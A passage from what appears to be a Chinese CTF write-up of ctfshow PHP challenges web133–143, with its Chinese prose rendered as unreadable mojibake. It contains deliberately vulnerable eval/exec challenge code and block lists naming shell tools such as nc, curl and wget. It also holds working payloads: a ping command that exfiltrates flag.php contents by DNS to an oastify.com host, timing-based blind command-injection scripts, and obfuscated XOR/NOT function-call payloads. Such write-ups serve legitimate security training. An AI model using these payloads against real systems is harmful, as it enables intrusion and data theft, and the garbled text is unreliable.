é€’?a&#x3D;1ï¼Œæ‰§è¡Œåå°±æ˜¯$a&#x3D;1ã€‚<br>é‚£ä¹ˆç›¸å¯¹çš„ï¼Œä¼ é€’<code>_POST</code>ï¼Œå°±æ˜¯å¯¹<code>$_POST</code>è¿›è¡Œèµ‹å€¼ï¼Œæ­£å¥½å°±å¯ä»¥ç»•è¿‡ifæ¡ä»¶å¯¹postçš„é™åˆ¶ã€‚<br>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p>payloadï¼š<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>é™åˆ¶äº†è®¸å¤šå‘½ä»¤ï¼Œpingå¯ä»¥ç”¨ï¼Œè¯»å–å‘½ä»¤<code>nl</code>å¯ä»¥ç”¨ã€‚<br>grepè¢«é™åˆ¶äº†ï¼Œå¯ä»¥ç”¨awkæŒ‡å®šè¡Œå·è¾“å‡ºï¼Œä¸è¿‡éœ€è¦é€è¡Œæµ‹è¯•ï¼Œåœ¨15è¡Œæœ‰flagã€‚æˆ–è€…å‚è€ƒä¹‹å‰flagçš„æ ¼å¼ï¼Œä¹Ÿå¯ä»¥æ¨æµ‹å‡ºæ¥æ˜¯15ã€‚</p><p>è¿™ä¸ªé¢˜è¿˜æŠŠflagåˆ†æˆäº†ä¸¤ä¸ªï¼Œè¡Œå·15å’Œ16ï¼Œéœ€è¦æ‹¼æ¥ä¸€ä¸‹ã€‚</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+ping <span class="token variable"><span class="token variable">`</span><span class="token function">nl</span> flag.php<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'NR==15'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.i1k4phddlneygl58oqbjxv93full9a.oastify.com</code></pre><p>å‘ç°æ–°è§£æ³•ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span>+<span class="token punctuation">;</span>cp+flag.php+1.txt</code></pre><h4 id="web136-tee"><a href="#web136-tee" class="headerlink" title="web136(tee)"></a>web136(tee)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p><code>tee</code>ç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</p><p>Payload:</p><blockquote><p>?c&#x3D;ls &#x2F;|tee 1</p><p>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1</p></blockquote><h4 id="web137-call-user-func"><a href="#web137-call-user-func" class="headerlink" title="web137(call_user_func)"></a>web137(call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><blockquote><p><a href="https://stackoverflow.com/questions/10534360/php-call-user-func-on-a-static-method">PHP call_user_func on a static method</a></p><pre class="language-none"><code class="language-none">$class &#x3D; &#39;\\MyBundleNamespace\\MyClass&#39;; $method &#x3D; &#39;myFunction&#39;;</code></pre><p>Both calls should work:</p><pre class="language-none"><code class="language-none">call_user_func(&quot;$class::$method&quot;); call_user_func(array($class, $method));</code></pre></blockquote><p>payload: <code>ctfshow=ctfshow::getFlag</code><br>payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><p>è¿‡æ»¤äº†::ä½†æ˜¯å¯ä»¥ç”¨æ•°ç»„</p><h4 id="web139-å‘½ä»¤ç›²æ³¨"><a href="#web139-å‘½ä»¤ç›²æ³¨" class="headerlink" title="web139(å‘½ä»¤ç›²æ³¨)"></a>web139(å‘½ä»¤ç›²æ³¨)</h4><p>ä½¿ç”¨teeå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ç›²æ³¨</p><p><strong>ls &#x2F;</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'_~'</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#è¡Œ</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#åˆ—</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#awk 'NR==&#123;0&#125;'é€è¡Œè¾“å‡ºè·å–</span>        <span class="token comment">#cut -c &#123;1&#125; æˆªå–å•ä¸ªå­—ç¬¦</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'~'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>                result<span class="token operator">+=</span><span class="token string">" "</span></code></pre><p><strong>cat &#x2F;f149_15_h3r3</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web140-php-intval"><a href="#web140-php-intval" class="headerlink" title="web140(php &#x3D;&#x3D;  intval)"></a>web140(php &#x3D;&#x3D;  intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">phpæ¯”è¾ƒç»•è¿‡ï¼ˆå¼ºæ¯”è¾ƒâ€œ&#x3D;&#x3D;&#x3D;â€&#x2F;å¼±æ¯”è¾ƒâ€œ&#x3D;&#x3D;â€œï¼‰</a></p><p>å› ä¸ºæ˜¯<code>==</code>ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²å…ˆè½¬åŒ–æˆæ•°å­—ç±»å‹åœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p><p>å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´æ—¶ï¼Œä»¥å¼€å¤´æ•°å­—ï¼ˆåˆ°å­—æ¯å‡ºç°æˆªæ­¢ï¼‰ä½œä¸ºè½¬æ¢ç»“æœï¼›å¼€å¤´ä¸æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²æˆ–ç©ºï¼ˆnullï¼‰ï¼Œåˆ™è½¬æ¢ä¸º0ã€‚</p><blockquote><p>â€˜12â€™&#x3D;&#x3D;12    &#x2F;&#x2F;true<br>â€˜12abcâ€™&#x3D;&#x3D;12 &#x2F;&#x2F;true<br>â€˜adm2nâ€™&#x3D;&#x3D;0  &#x2F;&#x2F;true</p></blockquote><p>æ‰€ä»¥åªéœ€è¦$codeçš„å€¼ä¸ä¸º1å¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ï¼Œäºæ˜¯æ„é€ è®©å…¶è¿”å›0</p><blockquote><p>intval() æˆåŠŸæ—¶ï¼Œè¿”å›å‚æ•°çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚<br>å­—ç¬¦ä¸²æœ‰å¯èƒ½è¿”å› 0ï¼Œå–å†³äºå­—ç¬¦ä¸²æœ€å·¦ä¾§çš„å­—ç¬¦ã€‚<br>intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚</p></blockquote><p>Payload:</p><blockquote><p>system(system())â€”&gt; f1&#x3D;system&amp;f2&#x3D;system</p><p>string system( string $command[, int &amp;$return_var] )ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œå¤±è´¥åˆ™è¿”å› FALSE ã€‚system()å¿…é¡»åŒ…å«å‚æ•°ï¼Œå¤±è´¥è¿”å›FLASEï¼›system(â€˜FLASEâ€™)ï¼Œç©ºæŒ‡ä»¤ï¼Œå¤±è´¥è¿”å›FLASEã€‚</p><p>usleep(usleep())â€”&gt; f1&#x3D;usleep&amp;f2&#x3D;usleep<br>usleepæ²¡æœ‰è¿”å›å€¼ã€‚ æ‰€ä»¥intvalå‚æ•°ä¸ºç©ºï¼Œå¤±è´¥è¿”å›0</p><p>getdate(getdate())â€”&gt; f1&#x3D;getdate&amp;f2&#x3D;getdate</p><p>array getdate([ int $timestamp &#x3D; time()] )ï¼šè¿”å›ç»“æœæ˜¯arrayï¼Œå‚æ•°å¿…é¡»æ˜¯intå‹ã€‚æ‰€ä»¥getdate(getdate())â€”-&gt;getdate(arrayå‹)â€”&gt;å¤±è´¥è¿”å›flaseï¼Œintvalä¸º0ã€‚</p></blockquote><h4 id="web141-å‡½æ•°ä¸æ•°å­—è¿ç®—"><a href="#web141-å‡½æ•°ä¸æ•°å­—è¿ç®—" class="headerlink" title="web141(å‡½æ•°ä¸æ•°å­—è¿ç®—)"></a>web141(å‡½æ•°ä¸æ•°å­—è¿ç®—)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>\W</strong>ï¼šä¸ä»»ä½•éå•è¯å­—ç¬¦åŒ¹é…ã€‚å°±æ˜¯é™¤äº†æ•°å­—ã€å­—æ¯ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code>[^A-Za-z0-9_]</code></p><p>phpé‡Œæ•°å­—å¯ä»¥å’Œå‘½ä»¤å¯ä»¥è¿›è¡Œè¿ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´v3é‡Œè¦æ‰§è¡Œçš„å‡½æ•°å‰ååŠ ä¸Šè¿ç®—ç¬¦å³å¯ã€‚</p><p>ä¸¾ä¾‹ç†è§£ä¸€ä¸‹ï¼š<code>1-phpinfo()-1</code>çš„ç»“æœä¸º0ï¼Œphpinfo()æ‰§è¡ŒæˆåŠŸè¿”å›trueï¼Œ1-1-1&#x3D;-1ã€‚</p><p>åŒç†<code>system()</code>ä¹Ÿå¯æ‰§è¡Œã€‚</p><p>å–å<code>~</code>å¼‚æˆ–<code>^</code>æˆ–<code>|</code>éƒ½å¯ä»¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Payload:</p><blockquote><p>?v1&#x3D;1&amp;v2&#x3D;0&amp;v3&#x3D;%2b(â€œ%13%19%13%14%05%0dâ€|â€%60%60%60%60%60%60â€)(â€œ%03%01%14%00%06%0c%01%07%00%10%08%10â€|â€%60%60%60%20%60%60%60%60%2e%60%60%60â€)%2b</p><p>%2b&#x3D;+</p><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;-(<del>â€˜%8C%86%8C%8B%9A%92â€™)(</del>â€˜%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8Fâ€™)-</p></blockquote><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p>0å’Œ0x0ç»•è¿‡ è¿™é‡Œç»•è¿‡å› ä¸ºæ˜¯å› ä¸ºå½“æˆäº†8è¿›åˆ¶å’Œ16è¿›åˆ¶</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token 